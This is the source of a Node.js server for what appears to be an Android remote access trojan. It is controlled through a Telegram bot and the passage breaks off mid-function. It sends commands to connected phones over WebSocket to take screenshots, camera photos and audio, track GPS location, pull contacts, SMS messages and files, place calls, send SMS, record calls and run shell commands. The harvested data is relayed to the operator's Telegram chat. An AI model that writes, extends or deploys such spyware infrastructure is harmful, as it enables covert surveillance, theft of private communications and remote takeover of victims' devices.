require('dotenv').config();
const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// ============================================
// CONFIGURATION
// ============================================
const token = process.env.TELEGRAM_BOT_TOKEN;
const adminId = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 8999;

if (!token) {
    console.error('❌ TELEGRAM_BOT_TOKEN not set');
    process.exit(1);
}

// ============================================
// EXPRESS SETUP
// ============================================
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, clientTracking: true });

app.use(express.json({ limit: '50mb' }));

// ============================================
// DATA STRUCTURES
// ============================================
const connectedDevices = new Map();
const userSessions = new Map();
const pendingCommands = new Map();

// ============================================
// DIRECTORY CREATION
// ============================================
['uploads', 'screenshots', 'recordings', 'photos'].forEach(dir => {
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});

// ============================================
// FILE UPLOAD CONFIGURATION
// ============================================
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const type = req.headers['file-type'] || 'unknown';
        let dir = 'uploads';
        if (type.includes('screenshot')) dir = 'screenshots';
        else if (type.includes('audio') || type.includes('recording')) dir = 'recordings';
        else if (type.includes('photo') || type.includes('camera')) dir = 'photos';
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.headers['device-id'] || 'unknown';
        const timestamp = Date.now();
        const ext = path.extname(file.originalname);
        cb(null, `${deviceId}-${timestamp}${ext}`);
    }
});

const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 }
});

// ============================================
// KEEP ALIVE - PING DEVICES EVERY 5 SECONDS
// ============================================
setInterval(() => {
    const now = Date.now();
    connectedDevices.forEach((device, deviceId) => {
        try {
            if (device.ws && device.ws.readyState === 1) {
                device.ws.send(JSON.stringify({
                    type: 'ping',
                    timestamp: now
                }));
                
                if (now - device.lastSeen > 30000) {
                    console.log(`⚠️ Device ${deviceId} stale, terminating`);
                    device.ws.terminate();
                    connectedDevices.delete(deviceId);
                }
            }
        } catch (e) {}
    });
}, 5000);

// ============================================
// KEEP SERVER ALIVE - PING EVERY 12 HOURS
// ============================================
setInterval(() => {
    try {
        fetch(`https://dma-eq9s.onrender.com/health`)
            .catch(() => {});
        console.log('🔄 Server keep-alive ping sent');
    } catch (e) {}
}, 12 * 60 * 60 * 1000);

// ============================================
// KEYBOARD DEFINITIONS
// ============================================

// MAIN KEYBOARD
const mainKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '📱 Devices' }],
            [{ text: '❓ Help' }]
        ],
        resize_keyboard: true,
        one_time_keyboard: false
    }
};

// DEVICE SELECTION KEYBOARD
const deviceSelectionKeyboard = (devices) => {
    const buttons = [];
    devices.forEach((device, id) => {
        const model = device.deviceInfo?.model?.split(' ')[0] || 'Android';
        const shortId = id.substring(0, 4);
        buttons.push([{ text: `📱 ${model} (${shortId})` }]);
    });
    buttons.push([{ text: '🔙 Back' }]);
    
    return {
        reply_markup: {
            keyboard: buttons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    };
};

// DEVICE ACTION MENU - ALL COMMANDS
const deviceActionMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: 'ℹ️ Info', callback_data: `info_${deviceId}` },
                { text: '📱 Apps', callback_data: `apps_${deviceId}` }
            ],
            [
                { text: '📸 Screenshot', callback_data: `screenshot_${deviceId}` },
                { text: '📷 Camera', callback_data: `camera_${deviceId}` },
                { text: '🎤 Record', callback_data: `record_${deviceId}` }
            ],
            [
                { text: '📍 Location', callback_data: `location_${deviceId}` },
                { text: '📁 Files', callback_data: `files_${deviceId}` },
                { text: '📥 Download', callback_data: `download_${deviceId}` }
            ],
            [
                { text: '📞 Call', callback_data: `call_${deviceId}` },
                { text: '💬 SMS', callback_data: `sms_${deviceId}` }
            ],
            [
                { text: '📒 Contacts', callback_data: `contacts_${deviceId}` },
                { text: '📨 Messages', callback_data: `messages_${deviceId}` }
            ],
            [
                { text: '🖥️ Shell', callback_data: `shell_${deviceId}` },
                { text: '📂 Paths', callback_data: `paths_${deviceId}` }
            ],
            [
                { text: '📞 Record Call', callback_data: `record_call_${deviceId}` },
                { text: '⏹️ Stop Call', callback_data: `stop_call_${deviceId}` }
            ],
            [
                { text: '🔔 Notify', callback_data: `notify_${deviceId}` }
            ]
        ]
    }
});

// Camera selection menu
const cameraMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: '📷 Front Camera', callback_data: `camera_front_${deviceId}` },
                { text: '📷 Rear Camera', callback_data: `camera_rear_${deviceId}` }
            ]
        ]
    }
});

// Record duration menu
const recordMenu = (deviceId) => ({
    reply_markup: {
        inline_keyboard: [
            [
                { text: '5s', callback_data: `record_5_${deviceId}` },
                { text: '10s', callback_data: `record_10_${deviceId}` },
                { text: '30s', callback_data: `record_30_${deviceId}` }
            ],
            [
                { text: '1m', callback_data: `record_60_${deviceId}` },
                { text: '5m', callback_data: `record_300_${deviceId}` },
                { text: '10m', callback_data: `record_600_${deviceId}` }
            ]
        ]
    }
});

// REMOVE KEYBOARD
const removeKeyboard = { 
    reply_markup: { remove_keyboard: true } 
};

// ============================================
// BOT INITIALIZATION
// ============================================
let bot = null;

async function startBot() {
    try {
        await fetch(`https://api.telegram.org/bot${token}/deleteWebhook?drop_pending_updates=true`);
    } catch(e) {}
    
    bot = new TelegramBot(token, { 
        polling: { 
            interval: 200, 
            autoStart: true, 
            params: { timeout: 30 } 
        }
    });
    
    bot.getMe().then(me => console.log(`✅ Bot: @${me.username}`));
    bot.on('polling_error', () => {});
    
    setupBotCommandHandlers();
    setupBotCommands();
    return bot;
}

// ============================================
// BOT COMMANDS
// ============================================
async function setupBotCommands() {
    const commands = [
        { command: 'start', description: '🚀 Start DMA bot' },
        { command: 'help', description: '❓ Show help' },
        { command: 'keyboard', description: '⌨️ Show device selection' },
        { command: 'list', description: '📱 List all devices' },
        { command: 'info', description: 'ℹ️ Device info (ID)' },
        { command: 'screenshot', description: '📸 Take screenshot (ID)' },
        { command: 'camera', description: '📷 Take photo (ID + front/rear)' },
        { command: 'record', description: '🎤 Record audio (ID + seconds)' },
        { command: 'location', description: '📍 Get location (ID)' },
        { command: 'files', description: '📁 List files (ID + path)' },
        { command: 'download', description: '📥 Download file (ID + path)' },
        { command: 'call', description: '📞 Make call (ID + number)' },
        { command: 'sms', description: '💬 Send SMS (ID + number + text)' },
        { command: 'contacts', description: '📒 Get contacts (ID)' },
        { command: 'messages', description: '📨 Get messages (ID)' },
        { command: 'apps', description: '📱 List apps (ID)' },
        { command: 'shell', description: '🖥️ Run command (ID + cmd)' },
        { command: 'paths', description: '📂 Check accessible paths (ID)' },
        { command: 'record_call', description: '📞 Start call recording (ID)' },
        { command: 'stop_call', description: '⏹️ Stop call recording (ID)' },
        { command: 'notify', description: '🔔 Send notification (ID + title + msg)' }
    ];

    try {
        await bot.setMyCommands(commands);
        console.log(`✅ ${commands.length} commands registered`);
    } catch (error) {}
}

// ============================================
// WEBSOCKET SERVER
// ============================================
wss.on('connection', (ws, req) => {
    const deviceId = req.headers['device-id'];
    const deviceModel = req.headers['device-model'] || 'Unknown';
    
    if (!deviceId) return ws.close();
    
    ws.deviceId = deviceId;
    
    connectedDevices.set(deviceId, { 
        ws, 
        deviceInfo: { 
            id: deviceId, 
            model: deviceModel,
            android: req.headers['android-version'] || 'Unknown'
        },
        lastSeen: Date.now()
    });

    if (bot) {
        bot.sendMessage(adminId, `✅ Device connected: ${deviceModel}`).catch(()=>{});
    }

    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            
            if (msg.type === 'pong') {
                const device = connectedDevices.get(deviceId);
                if (device) device.lastSeen = Date.now();
            }
            else if (msg.type === 'response') {
                handleCommandResponse(deviceId, msg);
            }
            else if (msg.type === 'device_info') {
                const device = connectedDevices.get(deviceId);
                if (device) {
                    device.deviceInfo = { ...device.deviceInfo, ...msg.data };
                    device.lastSeen = Date.now();
                }
            }
        } catch(e) {}
    });

    ws.on('close', () => {
        connectedDevices.delete(deviceId);
        if (bot) {
            bot.sendMessage(adminId, `❌ Device disconnected`).catch(()=>{});
        }
    });

    ws.send(JSON.stringify({
        type: 'command',
        id: uuidv4(),
        command: 'get_device_info',
        timestamp: Date.now()
    }));
});

// ============================================
// COMMAND RESPONSE HANDLER
// ============================================
function handleCommandResponse(deviceId, response) {
    if (!bot) return;
    
    const device = connectedDevices.get(deviceId);
    const model = device?.deviceInfo?.model?.split(' ')[0] || deviceId.substring(0, 6);
    
    const pending = pendingCommands.get(response.commandId || response.id);
    if (pending) {
        pendingCommands.delete(response.commandId || response.id);
    }
    
    const chatId = pending?.chatId || adminId;
    
    if (!response.success) {
        bot.sendMessage(chatId, `❌ ${model}: ${response.error || 'Failed'}`).catch(()=>{});
        return;
    }

    // LOCATION
    if (response.data && response.data.lat !== undefined) {
        bot.sendLocation(chatId, response.data.lat, response.data.lng).catch(()=>{});
        bot.sendMessage(chatId, `📍 ${model}\nLat: ${response.data.lat}\nLng: ${response.data.lng}`).catch(()=>{});
    }
    
    // DEVICE INFO
    else if (response.data && response.data.model) {
        const msg = `📱 ${response.data.model || model}\nAndroid: ${response.data.android || '?'}\nBattery: ${response.data.battery?.toFixed(0) || '?'}%\nFree: ${formatBytes(response.data.internal_free)}`;
        bot.sendMessage(chatId, msg).catch(()=>{});
    }
    
    // CONTACTS
    else if (response.data && response.data.contacts) {
        try {
            const contactsJson = response.data.contacts;
            if (contactsJson && contactsJson !== "[]" && contactsJson !== "null" && contactsJson.length > 2) {
                const filename = `contacts_${deviceId}_${Date.now()}.txt`;
                const filepath = path.join(__dirname, 'uploads', filename);
                fs.writeFileSync(filepath, contactsJson);
                bot.sendDocument(chatId, filepath, {
                    caption: `📒 Contacts - ${model} (${response.data.count || '?'})`
                }).catch(()=>{});
                setTimeout(() => fs.unlinkSync(filepath), 60000);
            } else {
                bot.sendMessage(chatId, `📒 Contacts - ${model}\nNo contacts found`).catch(()=>{});
            }
        } catch (e) {
            bot.sendMessage(chatId, `📒 Contacts - ${model}\nError parsing contacts`).catch(()=>{});
        }
    }
    
    // MESSAGES
    else if (response.data && response.data.messages) {
        try {
            const messagesJson = response.data.messages;
            if (messagesJson && messagesJson !== "[]" && messagesJson !== "null" && messagesJson.length > 2) {
                const filename = `messages_${deviceId}_${Date.now()}.txt`;
                const filepath = path.join(__dirname, 'uploads', filename);
                fs.writeFileSync(filepath, messagesJson);
                bot.sendDocument(chatId, filepath, {
                    caption: `📨 SMS Messages - ${model} (${response.data.count || '?'})`
                }).catch(()=>{});
                setTimeout(() => fs.unlinkSync(filepath), 60000);
            } else {
                bot.sendMessage(chatId, `📨 Messages - ${model}\nNo messages found`).catch(()=>{});
            }
        } catch (e) {
            bot.sendMessage(chatId, `📨 Messages - ${model}\nError parsing messages`).catch(()=>{});
        }
    }
    
    // APPS
    else if (response.data && response.data.apps) {
        try {
            const appsJson = response.data.apps;
            if (appsJson && appsJson !== "[]" && appsJson !== "null" && appsJson.length > 2) {
                const filename = `apps_${deviceId}_${Date.now()}.txt`;
                const filepath = path.join(__dirname, 'uploads', filename);
                fs.writeFileSync(filepath, appsJson);
                bot.sendDocument(chatId, filepath, {
                    caption: `📱 Apps - ${model} (${response.data.count || '?'})`
                }).catch(()=>{});
                setTimeout(() => fs.unlinkSync(filepath), 60000);
            }
        } catch (e) {}
    }
    
    // FILES COMMAND
    else if (response.data && response.data.files) {
        try {
            const filesData = response.data;
            let message = `📁 *Files - ${model}*\nPath: \`${filesData.requested_path || filesData.path || '/'}\`\n`;
            
            if (filesData.file_count > 0) {
                message += `Files: ${filesData.file_count}\n\n`;
                
                if (filesData.files && Array.isArray(filesData.files) && filesData.files.length > 0) {
                    let fileList = '';
                    filesData.files.slice(0, 20).forEach(f => {
                        const icon = f.isDirectory ? '📁' : '📄';
                        const size = f.size ? ` (${formatBytes(f.size)})` : '';
                        fileList += `${icon} ${f.name}${size}\n`;
                    });
                    if (filesData.files.length > 20) {
                        fileList += `... and ${filesData.files.length - 20} more`;
                    }
                    bot.sendMessage(chatId, message + '```\n' + fileList + '```', { parse_mode: 'Markdown' }).catch(()=>{});
                }
            } else {
                message += '📭 No files found or directory not accessible';
                bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }).catch(()=>{});
            }
            
            if (filesData.suggested_paths) {
                let suggestMsg = '💡 Try these paths:\n';
                filesData.suggested_paths.forEach(p => suggestMsg += `\`${p}\`\n`);
                bot.sendMessage(chatId, suggestMsg, { parse_mode: 'Markdown' }).catch(()=>{});
            }
        } catch (e) {
            bot.sendMessage(chatId, `❌ Error parsing files`).catch(()=>{});
        }
    }
    
    // CHECK PATHS COMMAND
    else if (response.data && response.data.paths) {
        try {
            const paths = response.data.paths;
            let message = `📂 *Accessible Paths - ${model}*\n\n`;
            
            Object.keys(paths).forEach(key => {
                const path = paths[key];
                if (path.exists && path.canRead) {
                    const icon = path.isDirectory ? '📁' : '📄';
                    message += `${icon} \`${path.description}\`\n`;
                    if (path.contents_count !== undefined) {
                        message += `   📊 ${path.contents_count} items\n`;
                    }
                }
            });
            
            message += `\n📱 Android: ${response.data.android_version || '?'}`;
            bot.sendMessage(chatId, message, { parse_mode: 'Markdown' }).catch(()=>{});
        } catch (e) {
            bot.sendMessage(chatId, `❌ Error parsing paths`).catch(()=>{});
        }
    }
    
    // SHELL OUTPUT
    else if (response.data && response.data.output !== undefined) {
        const output = response.data.output.substring(0, 4000);
        const exitCode = response.data.exitCode !== undefined ? `\nExit code: ${response.data.exitCode}` : '';
        bot.sendMessage(chatId, 
            `🖥️ ${model}:\n\`\`\`\n${output}\n\`\`\`${exitCode}`, 
            { parse_mode: 'Markdown' }
        ).catch(()=>{});
    }
    
    // CALL
    else if (response.data && response.data.call_made) {
        bot.sendMessage(chatId, `📞 Call initiated to: ${response.data.number}`).catch(()=>{});
    }
    
    // SMS
    else if (response.data && response.data.sms_sent) {
        bot.sendMessage(chatId, `💬 SMS sent to: ${response.data.number}`).catch(()=>{});
    }
    
    // CALL RECORDING
    else if (response.data && response.data.call_recording_started) {
        bot.sendMessage(chatId, `📞 Call recording started`).catch(()=>{});
    }
    else if (response.data && response.data.call_recording_ended) {
        bot.sendMessage(chatId, `⏹️ Call recording ended`).catch(()=>{});
    }
    
    // NOTIFICATION
    else if (response.data && response.data.notification_sent) {
        bot.sendMessage(chatId, `🔔 Notification sent`).catch(()=>{});
    }
    
    // DEFAULT SUCCESS
    else {
        bot.sendMessage(chatId, `✅ ${model}: Command executed`).catch(()=>{});
    }
}

// ============================================
// SEND COMMAND TO DEVICE
// ============================================
function sendCommandToDevice(deviceId, command, data = {}, chatId = adminId) {
    const device = connectedDevices.get(deviceId);
    if (!device) return false;
    
    const cmdId = uuidv4();
    const cmdObj = {
        type: 'command',
        id: cmdId,
        command: command,
        data: data,
        timestamp: Date.now()
    };
    
    pendingCommands.set(cmdId, { chatId, deviceId, command });
    
    setTimeout(() => {
        pendingCommands.delete(cmdId);
    }, 30000);
    
    try {
        device.ws.send(JSON.stringify(cmdObj));
        console.log(`📤 Sent command ${command} to ${deviceId}`);
        return true;
    } catch (e) {
        pendingCommands.delete(cmdId);
        return false;
    }
}

// ============================================
// BOT COMMAND HANDLERS
// ============================================
function setupBotCommandHandlers() {
    if (!bot) return;

    // START COMMAND
    bot.onText(/\/start/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        bot.sendMessage(chatId, 
            `🤖 *DMA Bot*\n━━━━━━━━━━━━━\n` +
            `📱 Connected: ${connectedDevices.size}\n` +
            `⚡ Tap '📱 Devices' to begin`,
            { 
                parse_mode: 'Markdown',
                reply_markup: mainKeyboard.reply_markup 
            }
        ).catch(()=>{});
    });

    // HELP COMMAND
    bot.onText(/\/help/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const help = 
`🤖 *DMA Bot Commands*
━━━━━━━━━━━━━

*📱 DEVICE*
/list - Show all devices
/info [id] - Device info

*📸 MEDIA*
/screenshot [id] - Screenshot
/camera [id] [f/r] - Photo
/record [id] [sec] - Audio

*📍 LOCATION & FILES*
/location [id] - GPS
/files [id] [path] - List files
/download [id] [path] - Download
/paths [id] - Check accessible paths

*📞 COMMUNICATION*
/call [id] [num] - Make call
/sms [id] [num] [text] - Send SMS
/contacts [id] - Get contacts
/messages [id] - Get SMS

*📱 APPS*
/apps [id] - List apps

*🖥️ ADVANCED*
/shell [id] [cmd] - Run command

*📞 CALL RECORDING*
/record_call [id] - Start recording
/stop_call [id] - Stop recording

*🔔 OTHER*
/notify [id] [title] [msg] - Notification
/keyboard - Show device menu
/help - This message

━━━━━━━━━━━━━
💡 Tap '📱 Devices' for menu`;
        
        bot.sendMessage(chatId, help, { parse_mode: 'Markdown' }).catch(()=>{});
    });

    // KEYBOARD COMMAND
    bot.onText(/\/keyboard/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices').catch(()=>{});
        }
        
        bot.sendMessage(chatId, '📱 *Select device:*', { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(()=>{});
    });

    // LIST COMMAND
    bot.onText(/\/list/, (msg) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        showDeviceList(chatId);
    });

    function showDeviceList(chatId) {
        if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, '📭 No devices').catch(()=>{});
        }
        
        let text = `📱 *Devices (${connectedDevices.size})*\n━━━━━━━━━━━━━\n`;
        connectedDevices.forEach((d, id) => {
            const model = d.deviceInfo?.model?.split(' ')[0] || 'Unknown';
            const battery = d.deviceInfo?.battery ? `${d.deviceInfo.battery.toFixed(0)}%` : '?';
            text += `• *${model}* [${battery}]\n  ID: \`${id}\`\n`;
        });
        
        bot.sendMessage(chatId, text, { 
            parse_mode: 'Markdown',
            reply_markup: deviceSelectionKeyboard(connectedDevices).reply_markup 
        }).catch(()=>{});
    }

    // INFO COMMAND
    bot.onText(/\/info (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'get_device_info', {}, chatId)) {
            bot.sendMessage(chatId, `ℹ️ Getting info...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // SCREENSHOT COMMAND
    bot.onText(/\/screenshot (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'take_screenshot', {}, chatId)) {
            bot.sendMessage(chatId, `📸 Taking screenshot...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // CAMERA COMMAND
    bot.onText(/\/camera (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const cameraType = match[2].toLowerCase().includes('front') ? 'front' : 'rear';
        
        if (sendCommandToDevice(deviceId, 'take_photo', { camera: cameraType }, chatId)) {
            bot.sendMessage(chatId, `📷 Taking ${cameraType} photo...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // RECORD COMMAND
    bot.onText(/\/record (.+) (\d+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const seconds = parseInt(match[2]);
        
        if (sendCommandToDevice(deviceId, 'record_audio', { seconds }, chatId)) {
            bot.sendMessage(chatId, `🎤 Recording ${seconds}s...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // LOCATION COMMAND
    bot.onText(/\/location (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'get_location', {}, chatId)) {
            bot.sendMessage(chatId, `📍 Getting location...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // FILES COMMAND
    bot.onText(/\/files (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const path = match[2].trim();
        
        if (sendCommandToDevice(deviceId, 'files', { path: path }, chatId)) {
            bot.sendMessage(chatId, `📁 Listing files...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // DOWNLOAD COMMAND
    bot.onText(/\/download (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const path = match[2].trim();
        
        if (sendCommandToDevice(deviceId, 'get_file', { path: path }, chatId)) {
            bot.sendMessage(chatId, `📥 Downloading file...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // CALL COMMAND
    bot.onText(/\/call (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const number = match[2].trim();
        
        if (sendCommandToDevice(deviceId, 'make_call', { number }, chatId)) {
            bot.sendMessage(chatId, `📞 Calling ${number}...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // SMS COMMAND
    bot.onText(/\/sms (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const number = match[2].trim();
        const message = match[3].trim();
        
        if (sendCommandToDevice(deviceId, 'send_sms', { number, message }, chatId)) {
            bot.sendMessage(chatId, `💬 Sending SMS...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // CONTACTS COMMAND
    bot.onText(/\/contacts (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'list_contacts', {}, chatId)) {
            bot.sendMessage(chatId, `📒 Getting contacts...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // MESSAGES COMMAND
    bot.onText(/\/messages (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'get_messages', {}, chatId)) {
            bot.sendMessage(chatId, `📨 Getting messages...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // APPS COMMAND
    bot.onText(/\/apps (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'list_apps', {}, chatId)) {
            bot.sendMessage(chatId, `📱 Getting apps...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // SHELL COMMAND
    bot.onText(/\/shell (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const command = match[2].trim();
        
        if (sendCommandToDevice(deviceId, 'execute', { cmd: command }, chatId)) {
            bot.sendMessage(chatId, `🖥️ Executing...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // PATHS COMMAND
    bot.onText(/\/paths (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'check_paths', {}, chatId)) {
            bot.sendMessage(chatId, `📂 Checking paths...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // RECORD CALL COMMAND
    bot.onText(/\/record_call (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'start_call_recording', {}, chatId)) {
            bot.sendMessage(chatId, `📞 Starting call recording...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // STOP CALL COMMAND
    bot.onText(/\/stop_call (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        if (sendCommandToDevice(deviceId, 'stop_call_recording', {}, chatId)) {
            bot.sendMessage(chatId, `⏹️ Stopping call recording...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // NOTIFY COMMAND
    bot.onText(/\/notify (.+) (.+) (.+)/, (msg, match) => {
        const chatId = msg.chat.id;
        if (chatId.toString() !== adminId) return;
        
        const deviceId = match[1].trim();
        const title = match[2].trim();
        const message = match[3].trim();
        
        if (sendCommandToDevice(deviceId, 'send_notification', { title, message }, chatId)) {
            bot.sendMessage(chatId, `🔔 Sending notification...`).catch(()=>{});
        } else {
            bot.sendMessage(chatId, `❌ Device not found`).catch(()=>{});
        }
    });

    // MESSAGE HANDLER - BUTTONS & INPUT
    bot.on('message', (msg) => {
        const chatId = msg.chat.id;
        const text = msg.text;
        
        if (chatId.toString() !== adminId || !text) return;
        if (text.startsWith('/')) return;
        
        if (text === '📱 Devices') {
            showDeviceList(chatId);
        }
        else if (text === '❓ Help') {
            bot.sendMessage(chatId, 'Type /help for commands', { 
                reply_markup: mainKeyboard.reply_markup 
            }).catch(()=>{});
        }
        else if (text === '🔙 Back') {
            bot.sendMessage(chatId, 'Main menu', { 
                reply_markup: mainKeyboard.reply_markup 
            }).catch(()=>{});
            clearUserSession(chatId);
        }
        else if (text.includes('📱') && text.includes('(') && text.includes(')')) {
            const deviceEntry = Array.from(connectedDevices.entries()).find(([id]) => 
                text.includes(id.substring(0, 4))
            );
            
            if (deviceEntry) {
                const [deviceId, device] = deviceEntry;
                const model = device.deviceInfo?.model?.split(' ')[0] || 'Device';
                
                bot.sendMessage(chatId, 
                    `📱 *${model}*\nID: \`${deviceId}\`\n\n*Select action:*`,
                    { 
                        parse_mode: 'Markdown',
                        reply_markup: deviceActionMenu(deviceId).reply_markup 
                    }
                ).catch(()=>{});
                
                clearUserSession(chatId);
            }
        }
        
        const session = getUserSession(chatId);
        if (!session) return;
        
        // Handle different session states
        if (session.state === 'awaiting_files_path' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'files', { path: text.trim() }, chatId);
            bot.sendMessage(chatId, `📁 Listing files...`, removeKeyboard).catch(()=>{});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_download_path' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'get_file', { path: text.trim() }, chatId);
            bot.sendMessage(chatId, `📥 Downloading...`, removeKeyboard).catch(()=>{});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_call_number' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'make_call', { number: text.trim() }, chatId);
            bot.sendMessage(chatId, `📞 Calling...`, removeKeyboard).catch(()=>{});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_sms_number' && session.deviceId) {
            setUserSession(chatId, { 
                state: 'awaiting_sms_text', 
                deviceId: session.deviceId, 
                number: text.trim() 
            });
            bot.sendMessage(chatId, `💬 Enter message:`).catch(()=>{});
        }
        else if (session.state === 'awaiting_sms_text' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'send_sms', { 
                number: session.number, 
                message: text.trim() 
            }, chatId);
            bot.sendMessage(chatId, `💬 Sending...`, removeKeyboard).catch(()=>{});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_shell_command' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'execute', { cmd: text.trim() }, chatId);
            bot.sendMessage(chatId, `🖥️ Executing...`, removeKeyboard).catch(()=>{});
            clearUserSession(chatId);
        }
        else if (session.state === 'awaiting_notification_title' && session.deviceId) {
            setUserSession(chatId, { 
                state: 'awaiting_notification_message', 
                deviceId: session.deviceId, 
                title: text.trim() 
            });
            bot.sendMessage(chatId, `🔔 Enter message:`).catch(()=>{});
        }
        else if (session.state === 'awaiting_notification_message' && session.deviceId) {
            sendCommandToDevice(session.deviceId, 'send_notification', { 
                title: session.title, 
                message: text.trim() 
            }, chatId);
            bot.sendMessage(chatId, `🔔 Sent`, removeKeyboard).catch(()=>{});
            clearUserSession(chatId);
        }
    });

    // CALLBACK QUERY HANDLER
    bot.on('callback_query', async (callbackQuery) => {
        const chatId = callbackQuery.message.chat.id;
        const data = callbackQuery.data;
        
        if (chatId.toString() !== adminId) return;
        
        await bot.answerCallbackQuery(callbackQuery.id).catch(()=>{});
        
        const parts = data.split('_');
        const action = parts[0];
        let deviceId = parts.slice(1).join('_');
        
        // Handle camera submenu
        if (action === 'camera' && (parts[1] === 'front' || parts[1] === 'rear')) {
            deviceId = parts.slice(2).join('_');
            sendCommandToDevice(deviceId, 'take_photo', { camera: parts[1] }, chatId);
            await bot.sendMessage(chatId, `📷 Taking ${parts[1]} photo...`).catch(()=>{});
        }
        // Handle record submenu
        else if (action === 'record' && parts.length >= 3) {
            const seconds = parseInt(parts[1]);
